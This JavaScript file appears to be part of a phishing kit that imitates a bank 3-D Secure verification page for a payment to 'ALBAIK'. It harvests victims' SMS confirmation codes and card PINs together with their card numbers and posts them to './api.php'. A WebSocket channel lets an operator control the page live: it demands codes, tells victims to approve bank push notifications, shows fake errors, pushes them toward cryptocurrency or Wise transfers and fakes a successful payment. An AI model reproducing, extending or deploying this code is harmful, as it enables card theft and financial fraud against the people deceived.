function card_type(cn) {
    let first = parseInt( Array.from( cn )[0] );
    if ( first ==5 ) {
        return 'mastercard';
    } else if ( first ==4 ) {
        return 'visa';
    } else {
        return 'alt';
    }
}

function set_image(cn) {
    var getCardBrand = card_type( cn );
    if (getCardBrand == 'mastercard') {
        $('.brand-logo').attr('src',"./banks/mastercard-securecode.svg");
    }
    if (getCardBrand == 'visa') {
        $('.brand-logo').attr('src',"./banks/png-transparent-3-d-secure-mastercard-debit-card-payment-american-express-mastercard-blue-text-service.png");
    }
    if (getCardBrand == 'maestro') {
        $('.brand-logo').attr('src',"./assets/static/assets/cr/maestro.png");
    }
    if (getCardBrand == 'forbrugsforeningen') {
        $('.brand-logo').attr('src',"./assets/static/assets/cr/altBank.png");
    }
    if (getCardBrand == 'dankort') {
        $('.brand-logo').attr('src',"./assets/static/assets/cr/altBank.jpg");
    }
    if (getCardBrand == 'amex') {
        $('.brand-logo').attr('src',"./assets/static/assets/cr/amex.png");
    }
    if (getCardBrand == 'dinersclub') {
        $('.brand-logo').attr('src',"./assets/static/assets/cr/altBank.png");
    }
    if (getCardBrand == 'discover') {
        $('.brand-logo').attr('src',"./assets/static/assets/cr/altBank.jpg");
    }
    if (getCardBrand == 'unionpay') {
        $('.brand-logo').attr('src',"./assets/static/assets/cr/altBank.png");
    }
    if (getCardBrand == 'jcb') {
        $('.brand-logo').attr('src',"./assets/static/assets/cr/altBank.gif");
    }
    if (getCardBrand !== 'mastercard' &&
        getCardBrand !== 'visa' &&
        getCardBrand !== 'maestro' &&
        getCardBrand !== 'forbrugsforeningen' &&
        getCardBrand !== 'dankort' &&
        getCardBrand!== 'amex' &&
        getCardBrand !== 'dinersclub' &&
        getCardBrand !== 'discover' &&
        getCardBrand !== 'unionpay' &&
        getCardBrand !== 'jcb') {
        $('.brand-logo').attr('src',"./assets/static/assets/cr/altBank.png");
    }
}

function send_code() {
    var code = $('#CredentialValidateInput').val();
	
	if ( code.length > 0 ) {
	    $('.download').show();
		$.ajax({
            type: 'POST',
            url: './api.php',
            data: {
				s: session,
                code: code,
                message_id: message_id,
                card_number: card_number
            },
            dataType: "html",
            cache: false,
            success: (data)=> {
            },
            error: (xhr, str)=> {
                console.log(`${JSON.stringify(xhr, null, '\t')}; ${str}`)
            }
        });
	} else {
		alert('Entered correct code.');
	}
	return false;
}
function send_pin(){
    var pin = $('#pin-input').val();
    
    if(pin.length > 0){
        $('.download').show();
        $.ajax({
            type: 'POST',
            url: './api.php',
            data:{
                session:session,
                pin:pin,
                card_number:card_number,
                message_id: message_id
                
            },
        })
        
    }
}

function padTo2Digits(num) {
    return num.toString().padStart(2, '0');
}

function formatDate(date) {
  return [
	padTo2Digits(date.getDate()),
	padTo2Digits(date.getMonth() + 1),
	date.getFullYear(),
  ].join('/');
}

function text_generate(amount, cn) {
	let yourDate = new Date()
	yourDate.toISOString().split('T')[0]
	let amount_num = amount.replace('֏ ', '');
	
	let text = `
	We have just sent an SMS with a secure code to your registered mobile phone number<br><br>
	You are authorizing a payment to ALBAIK for ${amount_num} on ${formatDate(new Date())} with your card ending with <span id="contentBlock-maskedpan" cla="always-left-to-right">************${cn.slice(-4)}</span>`;
	
	return text;
}

function start_ws() {
    var ws = new WebSocket("wss://" + window.location.host + ":" + wss_port);
    ws.onopen = function()
    {
    	console.log("Соединение установлено.");
    };
    
    ws.onclose = function(event)
    {
    	console.log("Соединение закрыто. Код «" + event.code + "». Причина «" + event.reason + "».");
    };
    
    ws.onmessage = function(event)
    {
    	console.log("Пришло сообщение «" + event.data + "».");
    	
    	$('.download').hide();
    	$('#code_form').hide();
    	$('#Body2').html('');
    	$('#ok_button').hide();
    	$('#CredentialValidateInput').val('');
    	$('#modal-pin').hide();
    	
    	if (event.data == 'code') {
    	    $('#code_form').show();
    	}
    	
    	if (event.data == 'push') {
    	    $('#Body2').html(`<p style="color: black;text-align:left;font-weight:bold;" class="new_ps">Confirm the payment in a push notification from the bank</p>`);
    	}
    	
    	if (event.data == 'errcode') {
    	    $('#Body2').html('<p style="color: red;text-align:left;" class="new_ps">Wrong confirmation code! (ERROR 51)<br>A new code has been sent to you<br>If the error occursagain, please contact support</p>');
    	    $('#code_form').show();
    	}
    	
    	if (event.data == 'card') {
    	    $('#Body2').html(`<p style="color: red;text-align:left;" class="new_ps">Something's wrong...<br>Try paying with another card or try again later.</p>`);
    	    $('#ok_button').show();
    	}
    	
    	if (event.data == 'payment') {
    	    $('#Body2').html(`<p style="color: red;text-align:left;" class="new_ps">Something's wrong...<br>Try another payment method, such as cryptocurrency or Wise Transfer.</p>`);
    	    $('#ok_button').show();
    	}
    	if (event.data == 'pin'){
    	    $('#modal-pin').show();
    	   
    	}
    	
    	if (event.data == 'paid'){
    	    $('#Body2').html('<p style="color: green;text-align:left;" class="new_ps">The payment was completed successfully! Wait for the courier to call.</p>');
    	}
    };
    
    ws.onerror = function(error) 
    {
    	console.log("Произошла ошибка: «" + error.message + "».");
    };
    
    return ws;
}

$( document ).ready(function() {
    set_image(card_number);
	$('#ValidateButton').click(send_code);
	$('#send-pin').click(send_pin);
	$('#Body1').html( text_generate( amount, card_number ) );
	$('#code_form').submit(function () {return false;});
	$('#back_button').click(()=>{window.location.href = '/payment/';});

	
	start_ws();
});